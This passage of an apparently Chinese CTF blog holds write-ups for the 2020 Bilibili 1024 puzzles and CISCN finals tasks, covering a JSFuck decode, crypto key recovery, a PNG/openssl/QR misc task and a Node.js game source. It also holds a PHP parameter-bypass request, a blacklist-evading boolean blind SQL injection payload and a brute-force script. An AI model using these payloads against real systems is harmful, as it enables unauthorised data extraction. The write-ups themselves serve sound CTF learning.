![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])) 一看就是 JSFuck，直接浏览器里执行得到 \"var str1 = \\\"\\\\u7a0b\\\\u5e8f\\\\u5458\\\\u6700\\\\u591a\\\\u7684\\\\u5730\\\\u65b9\\\"; var str2 = \\\"bilibili1024havefun\\\"; console.log()\" str1 为 程序员最多的地方 ==&gt; GitHub GitHub 上 找到了这里（ https://github.com/interesting-1024/end/blob/main/end.php &lt;?php //filename end.php $bilibili = \"bilibili1024havefun\"; $str = intval($_GET['id']); $reg = preg_match('/\\d/is', $_GET['id']); if(!is_numeric($_GET['id']) and $reg !== 1 and $str === 1){ $content = file_get_contents($_GET['url']); //文件路径猜解 if (false){ echo \"还差一点点啦～\"; }else{ echo $flag; } }else{ echo \"你想要的不在这儿～\"; } ?&gt; http://120.92.151.189/blog/end.php 你想要的不在这儿～ 构造payload： http://120.92.151.189/blog/end.php?id[]=1&amp;url=./flag.txt 得到下图，文件名称为 bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg 在文件最后藏了 flag10。 2ebd3b08-47ffc478-b49a5f9d-f6099d65 另外发现这个url只要包含 flag.txt 就返回这个。。 盲猜 /.+flag\\.txt.*/ 总结interesting-1024/end 这个仓库的 issue 简直成了聊天室…… 另外，有师傅在 https://www.bilibili.com/blackboard/activity-20201024.html 页面上发现了隐藏的彩蛋。 据说多次刷新重启可触发。 怎么说呢，总的感觉，这些题目更像是脑筋急转弯，略偏娱乐化这样吧。 就不像正经的 CTF 题的意思。 至于第6、7、9题，也没做下去的兴趣了。 就这样吧，不玩了，吃瓜吃瓜。 更新于 20201026 凌晨 （溜了喵","path":"2020/10/26/CTF_2020bilibiliSec1024/"},{"title":"CTF | 2020 CISCN 国赛总决赛 部分解题复现","text":"前言好不容易经过线上初赛、分区选拔赛，终于有机会去线下打了场 CTF 国赛，感谢大师傅们带我玩~ 辣鸡平台（ylbnb）什么的就不吐槽了，总的来说国赛其实还挺爽的 2333，混吃混喝划水的是我了。 第一天 AWD 一开始被打得贼惨了，中间修平台过了一个小时，本来都想好接下来要怎么打了，接着平台又崩了过了几个小时吃了个晚饭最后说不打了。。（第一次正式打 AWD 就是国赛了也太惨了 第二天改成了三小时 Break 解题赛 + 两小时 Fix，解题只会签到嘤嘤嘤（（（ 趁着还有点印象就来复现几个题吧。 （知道了我自己爪巴 CryptolockriseSource: import random import os from Crypto.Cipher import DES ''' sbox=list(range(256)) random.shuffle(sbox) print(sbox) ''' sbox=[217, 25, 248, 51, 6, 37, 32, 69, 96, 117, 86, 108, 155, 50, 27, 249, 171, 82, 168, 245, 228, 195, 118, 187, 12, 109, 99, 241, 26, 41, 194, 205, 236, 185, 73, 35, 139, 175, 44, 116, 48, 148, 22, 142, 190, 114, 201, 60, 59, 89, 181, 13, 10, 197, 151, 219, 87, 198, 191, 93, 152, 230, 34, 124, 173, 146, 226, 40, 101, 165, 83, 212, 206, 229, 16, 95, 56, 107, 144, 250, 149, 153, 208, 133, 145, 156, 172, 162, 113, 100, 183, 127, 57, 223, 130, 72, 135, 84, 147, 15, 242, 177, 42, 23, 122, 54, 0, 131, 166, 244, 88, 231, 94, 235, 29, 125, 7, 232, 110, 90, 179, 75, 220, 71, 251, 45, 243, 207, 58, 120, 184, 9, 39, 218, 63, 38, 254, 167, 140, 53, 213, 214, 80, 85, 128, 8, 64, 174, 132, 233, 65, 200, 36, 115, 215, 192, 74, 203, 11, 134, 104, 170, 160, 227, 169, 246, 141, 221, 52, 21, 20, 47, 199, 33, 216, 182, 188, 143, 138, 102, 202, 105, 79, 49, 253, 30, 121, 103, 137, 1, 211, 150, 5, 55, 196, 247, 240, 178, 159, 24, 81, 224, 210, 67, 157, 91, 28, 18, 186, 126, 237, 98, 252, 2, 239, 43, 180, 209, 238, 225, 68, 119, 66, 46, 61, 17, 31, 112, 62, 158, 189, 234, 193, 111, 204, 19, 77, 222, 164, 14, 97, 3, 70, 255, 78, 129, 163, 92, 76, 4, 123, 176, 106, 161, 154, 136] def lock(m): r=[] for i in m: r.append(sbox[i]) return r def peak(m): r=m[-1:]+m[0:-1] return r def rise(m,k): assert len(m)==len(k) r=[] for i in range(len(m)): r.append(m[i]^k[i]) return r key=os.urandom(8) secret=[1,2,3,4,5,6,7,8] r=lock(secret) r=peak(r) r=rise(r,key) r=lock(r) r=peak(r) r=rise(r,key) print(\"lockrise:\",r) print(\"k0 ^ k7:\",key[0]^key[-1]) secret=os.urandom(8) r=lock(secret) r=peak(r) r=rise(r,key) r=lock(r) r=peak(r) r=rise(r,key) print(\"encrypted:\",r) d=DES.new(secret,DES.MODE_ECB) flag=b\"flagxxxxx...xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" print(d.encrypt(flag).hex()) Output: lockrise: [158, 51, 193, 48, 114, 23, 164, 217] k0 ^ k7: 160 encrypted: [32, 98, 40, 152, 125, 149, 87, 167] 0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c 加密逻辑： input =&gt; sbox =&gt; right shift =&gt; xor key =&gt; sbox =&gt; right shift =&gt; xor key =&gt; output 求解 flag 逻辑： 求解 key =&gt; 根据 key 和 encrypted 反向解出 secret =&gt; 用 secret 作密钥 DES 解密 flag 再来看加密过程，input0 =&gt; sbox =&gt; right shift =&gt; xor k1 =&gt; sbox =&gt; right shift =&gt; xor k2 =&gt; output2. 反推可以得到 input6 =&gt; sbox =&gt; right shift =&gt; xor k7 =&gt; sbox =&gt; right shift =&gt; xor k0 =&gt; output0. 这样根据 k0 ^ k7 = 160 可以爆破 k0 &amp; k7 了。 secret=[1,2,3,4,5,6,7,8] r=lock(secret) r=peak(r) # [96, 25, 248, 51, 6, 37, 32, 69] 前两步骤加密都是确定的，可以直接从这里入手了。 r = [96, 25, 248, 51, 6, 37, 32, 69] lockrise = [158, 51, 193, 48, 114, 23, 164, 217] for k7 in range(256): k0 = 160 ^ k7 if sbox[r[7] ^ k7] ^ k0 == lockrise[0]: print(k0, k7) # 0 160 得到 k0 和 k7 分别为 0 和 160. 再将 k0 带入求解 k1. k0 = 0 for k1 in range(256): if sbox[r[0] ^ k0] ^ k1 == lockrise[1]: print(k1) # 180 依次求解下去即可得到key。 或者写个循环求也行。 key = [0] for i in range(0, 7): for k in range(256): if sbox[r[i] ^ key[i]] ^ k == lockrise[i + 1]: print(i, k) key.append(k) break print(key) # [0, 180, 224, 60, 139, 193, 154, 160] 所以 key 为 [0, 180, 224, 60, 139, 193, 154, 160]。 而后反过来求解 secret。 key = [0, 180, 224, 60, 139, 193, 154, 160] def inv_rise(m, k): assert len(m) == len(k) r = [] for i in range(len(m)): r.append(m[i] ^ k[i]) return r def inv_peak(m): r = m[1:] + m[0:1] # left shift return r def inv_lock(m): r = [] for i in m: r.append(sbox.index(i)) return r encrypted = [32, 98, 40, 152, 125, 149, 87, 167] x = inv_rise(encrypted, key) x = inv_peak(x) x = inv_lock(x) x = inv_rise(x, key) x = inv_peak(x) x = inv_lock(x) print(x) # [35, 239, 81, 231, 237, 218, 108, 166] 得到 secret 为 [35, 239, 81, 231, 237, 218, 108, 166]。 secret = [35, 239, 81, 231, 237, 218, 108, 166] flag = bytes.fromhex( \"0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c\") # 或者 # import binascii # flag = binascii.unhexlify( # \"0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c\") from Crypto.Cipher import DES d = DES.new(bytes(secret), DES.MODE_ECB) print(d.decrypt(flag)) # b'flag{lock_peak_rise_repeat_2333_7481233}' 得到 flag。 Misc签到 c3ludHt0MmpkZ2dqc2NuYTM2ZWwyfQ== base64 decode synt{t2jdggjscna36el2} 凯撒 flag{g2wqttwfpan36ry2} BadPic图片残缺了，拖进 010editor 里一看，发现文件最后面有一堆字符串，base64解密发现以 Salted开头，盲猜用了 openssl 什么加密吧。 另外 PNG_CHUNK chunk[8] 的 length 为 0。 于是先手动算了算再试了试长度，是 21535。（有没有什么脚本能直接算的唉，手算感觉好蠢 修改后得到完整的图片。 apache，这个应该就是加密的密钥了。 把图片末尾的字符串给提取出来，去掉 IDAT 等标识（还是复现的时候发现要这样整），合并两段 chunk。 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 然后拿这个去 https://tool.oschina.net/encrypt 在线解密，AES，密钥为 apache。 或者 openssl 解密 （这参数谁知道就是 aes256 呢，难不成爆破？） 先把上面的密文存到 enc.txt，而后执行下面的这个，输出保存到 out.txt 文件中。 cat enc.txt | base64 -d | openssl enc -aes256 -salt -d -out out.txt -pass pass:apache -md md5 另外大佬提醒说，openssl 1.1版本以上默认的hash不是md5，低版本的是md5。 得到一堆的01字符串，估计就是二维码了啦！ 统计一下长度为4900，正好70*70. 写个丑陋的jio本把二维码画出来。 from PIL import Image import numpy as np table = np.zeros((70, 70), dtype=int) i = 0 for row in range(70): for j in range(70): if s[i] == '1': table[row][j] = 1 else: table[row][j] = 0 i += 1 a = [[0 if b == 0 else 255 for b in row] for row in table] qrcode = Image.fromarray(np.uint8(np.array(a))) qrcode.show() qrcode.save(r\"./qr.png\") 得到二维码如下。 扫码得到 flag。 flag{lakks1qw23eeeaw345tywqiqajsajdwajdai} （寻思着现场断网环境做出来也太强了吧，怕不是 openssl 参数掌握的很熟练，要不然就是偷偷上网了？ （Misc 碰上 Crypto 就很头秃 （小声bb WebWeb1 ezsql&lt;h1&gt;Get The Flag&lt;/h1&gt; &lt;!-- $query = \"SELECT * FROM fake_flag WHERE id = $id limit 0,$limit\"; //$query = \"SELECT flag FROM real_flag WHERE id = $id limit 0,$limit\"; --&gt; &lt;form method=\"get\" class=\"form-group\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-md-1\"&gt; yourt id &lt;/div&gt; &lt;div class=\"col-md-4\"&gt; &lt;input type=\"text\" name=\"id\" class=\"form-control\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;input type=\"text\" name=\"limit\" hidden=\"\" value=\"1\"&gt; &lt;div class=\"row\"&gt; &lt;input type=\"submit\" value=\"get it\" class=\"btn\" btn-info=\"\"&gt; &lt;/div&gt; &lt;/form&gt; 是道 SQL 注入的题。根据提示真正的 flag 在 real_flag 这个表里，且字段名为 flag，需要通过 id 和 limit 这两个参数来注入。 现场试了发现一堆关键字都被过滤掉了，UNION、SUBSTR 不可行，' \" /**/ () 等等都被过滤掉了，只能盲注了。 然而试了很多都没被过滤了草…… 最后 fix 的时候发现读取数据库相关的源码长下面这样。 function is_safe($id, $limit){ $common_blacklist = [\"!\", \"\\\"\", \"#\", \"%\", \"&amp;\", \"'\", \";\", \"&lt;\", \"=\", \"&gt;\", \"\\\\\", \"^\", \"`\", \"|\" ,'between','not',\" \",\"like\",',']; $hack_list = ['union','join','in',\"/**/\",\"substr\",\"ascii\",\"left\",\"right\"]; $id_blacklist = ['left','right','like','(',')']; $limit_blacklist = ['-']; $blacklist = array_merge ($common_blacklist, $hack_list, $id_blacklist); foreach ($blacklist as $value) { if (stripos($id, $value) !== false) die(\"your param &lt;b&gt;id&lt;/b&gt; look like dangerous!\"); } $blacklist = array_merge ($common_blacklist, $hack_list, $limit_blacklist); foreach ($blacklist as $value) { if (stripos($limit, $value) !== false) die(\"your param &lt;b&gt;limit&lt;/b&gt; look like dangerous!\"); } if( $limit &gt; 10 or $limit &lt;= 0) { die(\"your param limit can't &gt;10 or &lt;=0\"); } return true; } if(isset($_GET[\"id\"]) &amp;&amp; isset($_GET['limit'])){ $id = $_GET[\"id\"]; $limit = $_GET['limit']; if(!is_safe($id, $limit)){ exit(\"stop , hack!\"); } $query = \"SELECT * FROM fake_flag WHERE id = $id limit 0,$limit\"; $result = $mysqli-&gt;query($query); if ($result === false) { die(\"database error, please check your input\"); } //var_dump($result); $row = $result-&gt;fetch_assoc(); if($row === NULL){ echo \"searched nothing\"; }else { var_dump($row); } while ($row = $result-&gt;fetch_assoc()) { var_dump($row); } $result-&gt;free(); $mysqli-&gt;close(); } 也就是说 id 过滤了括号，limit 过滤了 -，但可以反过来，且能用 \\t 代替空格，用 ord 代替 ascii，就可以 布尔盲注 了。 群里大佬的 payload: id=1\\tor\\t{x}-/*' &amp;limit='10\\tnana*/ord((select\\tgroup_concat(flag)\\tfrom\\treal_flag)) 构造出来的 SQL 语句长这样。 SELECT * FROM fake_flag WHERE id = 1\\tor\\t{x}-/*' limit 0, '10\\tnana*/ord((select\\tgroup_concat(flag)\\tfrom\\treal_flag)) 其中，ord函数返回的是字符串第一个字符的 ASCII 值，group_concat函数返回带有来自一个组的连接的非NULL值的字符串结果，也就是把flag字段的数据（默认用 , ）合并起来。 fake_flag 中有两项结果，id 分别对应着1和2。 如果 or 后面的表达式为假，即说明 x 和 flag 中的这一位对上了，那么查询出来的结果就只有一项了。 另外，发现没有拦截 MID，可以用这个来索引 flag。 于是进一步构造 SQL 语句： SELECT * FROM fake_flag WHERE id = 1\\tor\\t{x}-/*' limit 0, '10\\tnana*/ord((select\\tMID(group_concat(flag),2)\\tfrom\\treal_flag)) 所以大概就遍历一下 x 的取值，从而把 flag 爆破出来。 比如本地试一试，比如 f 对应 ASCII 为 102，此时只有一个结果。 当然也可以设置 id 为一个不存在的值，在正常情况下查询不到结果。 SELECT * FROM fake_flag WHERE id = 5\\tor\\t{x}-/*' limit 0, '10\\tnana*/ord((select\\tMID(group_concat(flag),2)\\tfrom\\treal_flag)) 加入注入语句后，如果 x 和 flag 中的相应位置字符没对应上，则 or 之后的表达式结果不为0，即为真，那么查询时将有结果返回； 而字符对应上的话，表达式结果为0，or 出来结果都为假，于是就查询不到结果。 这样也能实现布尔盲注。 参考网上jio本改了改：（大概逻辑这样，未实际测试 import requests import string mystring = string.printable # 所有可见字符 url = \"http://URL/\" url += \"?id=5\\tor\\t{0}-/*'&amp;limit='10\\tnana*/ord((select\\tmid(group_concat(flag),{1})\\tfrom\\treal_flag))\"\" reply = \"searched nothing\" print(url) count = 1 result = '' while True: temp_result = result for char in mystring: response = requests.post(url.format(ord(char), count)) if reply in response.content: result += char print(result + '......') break if result == temp_result: print('Complete!') break count+=1 （害，还是太菜了，连布尔盲注都不会嘤嘤嘤 Web2 battle是一道 Node.js 的题。 部分源码： function getPlayerDamageValue() //计算纯粹伤害 { if (player.buff) { return keepTwoDecimal(player.aggressivity+player.buff) } else return player.aggressivity } function triggerPassiveSkill() //触发被动技能 { switch (player.career) { case \"warrior\": player.buff = 5 return 1 case \"high_priest\" : player.HP += 10 player.HP = keepTwoDecimal(player.HP) return 2 case 'shooter' : player.buff = 7 return 3 default: return 0 } } function playerUseItem(round) { //ZLYG：治疗药膏，使用后回复10点生命值 //BYZF：白银之锋，使用后的一次攻击将触发暴击并造成130%的伤害 //XELD：邪恶镰刀，使用后将对方的一次攻击的攻击力变为80% if (round == player.round_to_use &amp;&amp; player.num == 1) { player.num = 0; switch (player.item) { case \"ZLYG\": player.HP += 10; return 1; case \"BYZF\": player.buff = player.aggressivity * 0.3; player.buff = keepTwoDecimal(player.buff) return 2; case \"XELD\": monster.buff = monster.aggressivity * (1 - 0.8) * (-1); monster.buff = keepTwoDecimal(monster.buff) return 3; } } else return 0 } function playerAttackMonster() { monster.HP -= (getPlayerDamageValue()) monster.HP = 